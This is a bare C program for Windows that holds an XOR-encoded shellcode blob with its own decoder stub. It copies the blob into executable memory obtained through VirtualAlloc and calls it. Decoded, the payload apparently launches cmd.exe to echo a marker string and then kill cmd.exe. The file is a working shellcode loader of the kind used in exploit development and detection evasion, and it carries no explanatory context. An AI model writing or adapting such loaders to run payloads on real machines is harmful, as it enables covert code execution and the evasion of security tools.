#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

char code[] = "\xeb\x1a\x58\x31\xdb\x89\xc2\x31\xc9\x8a\x1c\x08\x80\xfb\x90\x74\x09\x80\xf3"
"\xaa\x88\x1c\x08\x41\xeb\xef\xff\xe2\xe8\xe1\xff\xff\xff\x56\x42\x23\xaa\xaa"
"\xaa\xca\x23\x4f\x9b\x78\xce\x21\xf8\x9a\x21\xf8\xa6\x21\xf8\xbe\x21\xd8\x82"
"\xa5\x1d\xe0\x8c\x9b\x55\x9b\x6a\x06\x96\xcb\xd6\xa8\x86\x8a\x6b\x65\xa7\xab"
"\x6d\x48\x5a\xf8\xfd\x21\xf8\xba\x21\xe8\x96\xab\x7a\x21\xea\xd2\x2f\x6a\xde"
"\xe0\xab\x7a\xfa\x21\xe2\xb2\x21\xf2\x8a\xab\x79\x49\x96\xe3\x21\x9e\x21\xab"
"\x7c\x9b\x55\x9b\x6a\x06\x6b\x65\xa7\xab\x6d\x92\x4a\xdf\x5e\xa9\xd7\x52\x91"
"\xd7\x8e\xdf\x48\xf2\x21\xf2\x8e\xab\x79\xcc\x21\xa6\xe1\x21\xf2\xb6\xab\x79"
"\x21\xae\x21\xab\x7a\x23\xee\x8e\x8e\xf1\xf1\xcb\xf3\xf0\xfb\x55\x4a\xf2\xf5"
"\xf0\x21\xb8\x41\x2c\xf7\xc0\xab\x27\x2f\x13\xaa\xaa\xaa\xfa\xc2\x9b\x21\xc5"
"\x2d\x55\x7f\x11\x4a\xb7\x80\xa0\xc2\x0c\x3f\x17\x37\x55\x7f\x96\xac\xd6\xa0"
"\x2a\x51\x4a\xdf\xaf\x11\xed\xb9\xd8\xc5\xc0\xaa\xf9\x55\x7f\xc9\xc7\xce\x84"
"\xcf\xd2\xcf\x8a\x85\xc9\x8a\xcf\xc9\xc2\xc5\x8a\xdd\x9a\x9a\xc2\x9a\x9a\x8a"
"\x8c\x8a\xde\xcb\xd9\xc1\xc1\xc3\xc6\xc6\x8a\x85\xec\x8a\x85\xe3\xe7\x8a\xc9"
"\xc7\xce\x84\xcf\xd2\xcf\xaa\x90";

int main(int argc, char **argv)
{
	void *exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, sizeof(code));

	((void(*)())exec)();

	return 0;
}
